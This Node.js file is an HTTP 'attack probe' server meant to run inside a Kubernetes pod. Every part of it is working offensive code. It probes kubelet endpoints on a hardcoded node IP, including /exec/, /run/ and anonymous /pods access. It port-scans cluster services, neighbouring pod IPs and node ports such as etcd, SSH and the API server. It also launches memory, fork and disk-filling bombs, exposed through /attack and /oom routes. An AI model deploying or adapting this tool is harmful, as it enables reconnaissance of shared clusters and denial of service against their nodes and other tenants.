const http = require("http");
const https = require("https");
const os = require("os");
const fs = require("fs");
const net = require("net");
const { execSync, spawn } = require("child_process");

let results = {};

// 1. Kubelet Deep Probe - try to access pods info
async function probeKubeletDeep() {
  results.kubelet = { endpoints: {} };
  
  const nodeIP = "192.168.66.176";
  const endpoints = [
    "/pods",
    "/runningpods/",
    "/metrics",
    "/metrics/cadvisor",
    "/metrics/probes",
    "/configz",
    "/logs/",
    "/spec/",
    "/stats/summary",
    "/healthz",
    "/healthz/ping",
    "/run/",
    "/exec/",
    "/attach/",
    "/portForward/",
    "/containerLogs/"
  ];
  
  for (const endpoint of endpoints) {
    try {
      const resp = await new Promise((resolve, reject) => {
        const req = https.get(`https://${nodeIP}:10250${endpoint}`, {
          rejectUnauthorized: false,
          timeout: 5000,
          headers: {
            "Authorization": "Bearer anonymous"
          }
        }, (res) => {
          let body = "";
          res.on("data", c => body += c);
          res.on("end", () => resolve({ 
            status: res.statusCode, 
            headers: res.headers,
            body: body.substring(0, 1000) 
          }));
        });
        req.on("error", reject);
        req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
      });
      results.kubelet.endpoints[endpoint] = resp;
    } catch(e) {
      results.kubelet.endpoints[endpoint] = { error: e.message };
    }
  }
  
  // Try anonymous kubelet access
  try {
    const anonResp = await new Promise((resolve, reject) => {
      https.get(`https://${nodeIP}:10250/pods`, {
        rejectUnauthorized: false,
        timeout: 5000
      }, (res) => {
        let body = "";
        res.on("data", c => body += c);
        res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 2000) }));
      }).on("error", reject);
    });
    results.kubelet.anonymousAccess = anonResp;
  } catch(e) {
    results.kubelet.anonymousAccess = { error: e.message };
  }
}

// 2. Scan other pods in the cluster network
async function scanClusterNetwork() {
  results.networkScan = { pods: [], services: [] };
  
  // Get our pod's network info
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  results.networkScan.myIP = myIP;
  
  // Scan common K8s service ports
  const servicePorts = [80, 443, 3000, 5432, 6379, 8080, 8443, 9090, 27017];
  const scanTargets = [
    "10.100.0.1",      // K8s API
    "10.100.0.10",     // CoreDNS
    "10.100.188.155",  // Our app service
  ];
  
  // Also scan pod subnet
  const podSubnet = myIP ? myIP.split(".").slice(0, 2).join(".") : "192.168";
  
  for (const target of scanTargets) {
    results.networkScan.services.push({ target, ports: [] });
    for (const port of servicePorts) {
      const open = await scanPort(target, port, 500);
      if (open) {
        results.networkScan.services[results.networkScan.services.length - 1].ports.push(port);
      }
    }
  }
  
  // Quick scan of nearby pod IPs
  for (let i = 1; i <= 20; i++) {
    const targetIP = `${podSubnet}.73.${i}`;
    if (targetIP !== myIP) {
      const open = await scanPort(targetIP, 3000, 200);
      if (open) {
        results.networkScan.pods.push({ ip: targetIP, port: 3000 });
      }
    }
  }
}

async function scanPort(host, port, timeout = 500) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.on("error", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

// 3. Memory bomb - allocate until OOM (controlled)
async function memoryBomb(targetMB = 2000) {
  results.memoryBomb = { allocations: [], startFreeMem: os.freemem() };
  const chunks = [];
  let allocated = 0;
  
  try {
    while (allocated < targetMB) {
      const chunk = Buffer.alloc(100 * 1024 * 1024); // 100MB chunks
      // Fill with random data to ensure actual allocation
      chunk.fill(Math.random() * 255);
      chunks.push(chunk);
      allocated += 100;
      results.memoryBomb.allocations.push({
        mb: allocated,
        freeMem: os.freemem(),
        usedPercent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
      });
      
      // Check if we're close to OOM
      if (os.freemem() < 200 * 1024 * 1024) { // Less than 200MB free
        results.memoryBomb.stoppedAt = allocated + "MB";
        results.memoryBomb.reason = "Low memory threshold reached";
        break;
      }
    }
    results.memoryBomb.success = true;
    results.memoryBomb.totalAllocated = allocated + "MB";
    results.memoryBomb.finalFreeMem = os.freemem();
  } catch(e) {
    results.memoryBomb.error = e.message;
    results.memoryBomb.totalAllocated = allocated + "MB";
  }
  
  // Release memory
  chunks.length = 0;
  global.gc && global.gc();
  results.memoryBomb.afterRelease = os.freemem();
}

// 4. Fork bomb (mild - spawn many processes)
function forkBomb(count = 50) {
  results.forkBomb = { spawned: 0, pids: [] };
  
  try {
    for (let i = 0; i < count; i++) {
      const child = spawn("sleep", ["10"], { detached: true, stdio: "ignore" });
      child.unref();
      results.forkBomb.spawned++;
      results.forkBomb.pids.push(child.pid);
    }
    results.forkBomb.success = true;
  } catch(e) {
    results.forkBomb.error = e.message;
  }
}

// 5. Disk bomb - fill temp space
async function diskBomb(targetMB = 500) {
  results.diskBomb = { written: 0 };
  const chunk = Buffer.alloc(50 * 1024 * 1024); // 50MB
  chunk.fill(0xFF);
  
  const files = [];
  let written = 0;
  
  try {
    while (written < targetMB) {
      const filePath = `/tmp/diskbomb_${Date.now()}_${written}`;
      fs.writeFileSync(filePath, chunk);
      files.push(filePath);
      written += 50;
      results.diskBomb.written = written;
    }
    results.diskBomb.success = true;
    results.diskBomb.totalWritten = written + "MB";
  } catch(e) {
    results.diskBomb.error = e.message;
    results.diskBomb.totalWritten = written + "MB";
  }
  
  // Cleanup
  for (const f of files) {
    try { fs.unlinkSync(f); } catch(e) {}
  }
}

// 6. Try to access other node ports
async function scanNodePorts() {
  results.nodePorts = {};
  const nodeIP = "192.168.66.176";
  
  const importantPorts = [
    { port: 22, name: "SSH" },
    { port: 2379, name: "etcd" },
    { port: 2380, name: "etcd-peer" },
    { port: 6443, name: "K8s-API" },
    { port: 10248, name: "kubelet-healthz" },
    { port: 10249, name: "kube-proxy-metrics" },
    { port: 10250, name: "kubelet" },
    { port: 10251, name: "kube-scheduler" },
    { port: 10252, name: "kube-controller" },
    { port: 10255, name: "kubelet-readonly" },
    { port: 10256, name: "kube-proxy-healthz" },
    { port: 30000, name: "NodePort-start" },
    { port: 30080, name: "NodePort-80" },
    { port: 30443, name: "NodePort-443" }
  ];
  
  for (const { port, name } of importantPorts) {
    const open = await scanPort(nodeIP, port, 1000);
    results.nodePorts[name] = { port, open };
  }
}

// Server
const server = http.createServer(async (req, res) => {
  results = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    system: {
      freeMem: os.freemem(),
      totalMem: os.totalmem(),
      cpus: os.cpus().length,
      loadAvg: os.loadavg()
    }
  };
  
  try {
    if (req.url === "/attack") {
      // Full attack suite
      await probeKubeletDeep();
      await scanNodePorts();
      await scanClusterNetwork();
      forkBomb(30);
      await diskBomb(300);
      await memoryBomb(1500);
      
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/kubelet") {
      await probeKubeletDeep();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/oom") {
      // Aggressive memory bomb - will likely OOM
      await memoryBomb(5000);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/network") {
      await scanClusterNetwork();
      await scanNodePorts();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else {
      res.writeHead(200);
      res.end("Aggressive Attack Probe v2 - /attack, /kubelet, /oom, /network");
    }
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("Attack server started");
